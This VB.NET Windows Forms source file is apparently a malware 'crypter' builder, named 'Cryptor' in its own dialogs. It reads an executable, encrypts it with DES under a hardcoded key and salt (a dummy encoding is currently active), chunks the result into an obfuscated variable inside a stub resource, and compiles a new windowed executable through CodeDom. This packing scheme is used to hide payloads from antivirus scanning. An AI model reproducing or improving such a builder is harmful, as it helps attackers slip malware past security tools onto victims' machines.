Imports System.IO
Imports System.Security.Cryptography
Imports System.Web
Imports System.Text
Imports System
Imports System.CodeDom.Compiler
Imports System.Collections
Imports System.Collections.Generic
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Windows.Forms
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Public Class Form1
    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        Dim openFileDialog As OpenFileDialog
        openFileDialog = New OpenFileDialog()
        Dim openFileDialog1 As OpenFileDialog
        openFileDialog1 = openFileDialog
        Dim variable_FileType As String = "Executable "
        variable_FileType = variable_FileType & "Files ("
        variable_FileType = variable_FileType & "*.exe)|"
        variable_FileType = variable_FileType & "*.exe"

        openFileDialog1.Filter = variable_FileType
        openFileDialog1.ShowDialog()
        TextBox1.Text = openFileDialog1.FileName
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Dim text As String
        Dim variable_TextboxByte As Byte() = File.ReadAllBytes(TextBox1.Text)

        'text = Me.Encrypt(variable_TextboxByte)
        text = Me.EncryptDummy(variable_TextboxByte)

        Dim num As Integer = Convert.ToInt32(100)
        Dim value As String = Conversions.ToString(CDbl(text.Length) / CDbl(num))
        Dim num2 As Integer = 1
        Dim num3 As Integer = 0
        Do
            Dim str As String = Strings.Mid(text, num2, Conversions.ToInteger(value))
            RichTextBox1.Text = RichTextBox1.Text + ("gwiXxyIDDtoYzgMSRGMckRbJi = gwiXxyIDDtoYzgMSRGMckRbJi &""" + str) + """" & vbCrLf
            num2 = CInt(Math.Round(CDbl(num2) + Conversions.ToDouble(value)))
            num3 += 1
        Loop While num3 <= num

        'Dim text2 As String = My.Resources.Stub()
        Dim text2 As String = My.Resources.StubDummy()

        text2 = text2.Replace("~", RichTextBox1.Text)
        RichTextBox1.Text = text2
        Dim saveFileDialog As SaveFileDialog = New SaveFileDialog()
        saveFileDialog.FileName = ""
        saveFileDialog.Filter = "Executable Files (*.exe)|*.exe"
        If saveFileDialog.ShowDialog() = DialogResult.OK Then
            Codedom(saveFileDialog.FileName, text2)
            MessageBox.Show(saveFileDialog.FileName)
        End If
    End Sub

    Public Function Encrypt(Data As Byte()) As String
        Dim descryptoServiceProvider As New DESCryptoServiceProvider
        '
        'Encode as URL token
        Dim s As String = HttpServerUtility.UrlTokenEncode(Data)
        '
        'Create cryter streams and service providers
        Dim salt() As Byte = New Byte() {1, 2, 3, 4, 5, 6, 7, 8, 9, 0}
        Dim rfc2898DeriveBytes As New Rfc2898DeriveBytes("MkhMoOHCbGUMqtnRDJKnBYnOj", salt)
        descryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(descryptoServiceProvider.Key.Length)
        descryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(descryptoServiceProvider.IV.Length)
        Dim memoryStream As MemoryStream = New MemoryStream()
        Dim cryptoStream As CryptoStream = New CryptoStream(memoryStream, descryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write)
        '
        'Encode as BEUC bytes
        Dim bytes As Byte() = Encoding.BigEndianUnicode.GetBytes(s)
        '
        'Encrypt BEUC bytes
        cryptoStream.Write(bytes, 0, bytes.Length)
        cryptoStream.Close()
        '
        'URL Token encoded again
        Return HttpServerUtility.UrlTokenEncode(memoryStream.ToArray())
    End Function
    Dim T As New Random
    Function RandomString() As String
        Dim eng As String = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"
        Dim s As String
        s = eng
        Dim sb As New StringBuilder
        For i As Integer = 1 To 80
            Dim idx As Integer = T.Next(0, 177)
            sb.Append(s.Substring(idx, 1))
        Next
        Return sb.ToString
    End Function
    Public Shared Sub Codedom(ByVal saveFile As String, ByVal codes As String)
        On Error Resume Next
        Dim ICode As CodeDomProvider = CodeDomProvider.CreateProvider("VisualBasic")
        Dim CParameters As New CompilerParameters()
        Dim RCompiler As CompilerResults
        CParameters.GenerateExecutable = True
        CParameters.OutputAssembly = saveFile
        CParameters.CompilerOptions = "/target:winexe"
        CParameters.ReferencedAssemblies.Add("System.dll")
        CParameters.ReferencedAssemblies.Add("System.Windows.Forms.dll")
        CParameters.ReferencedAssemblies.Add("System.Web.dll")
        Dim DPath = New Dictionary(Of String, String)
        DPath.Add("CompilerVersion", "v2.0")
        CParameters.CompilerOptions = "/platform:X86 /target:winexe"
        RCompiler = ICode.CompileAssemblyFromSource(CParameters, codes)
        If RCompiler.Errors.Count > 0 Then
            MessageBox.Show(RCompiler.Output, ("Cryptor"), MessageBoxButtons.OK, MessageBoxIcon.Error)
            For Each CompilerError In RCompiler.Errors
                MessageBox.Show(CompilerError.ErrorText, ("Cryptor"), MessageBoxButtons.OK, MessageBoxIcon.Error)
            Next
        ElseIf RCompiler.Errors.Count = 0 Then
            MessageBox.Show("Werk", ("Cryptor"), MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        RichTextBox1.Text = ""
    End Sub

    Public Function EncryptDummy(Data As Byte()) As String
        Dim variable_string As String = HttpServerUtility.UrlTokenEncode(Data)
        'Originial
        'Dim variable_bytes As String = System.Text.Encoding.UTF8.GetString(Data)
        'Dim s As String = System.Text.Encoding.UTF32.GetString(variable_bytes)
        Return variable_string
    End Function
End Class
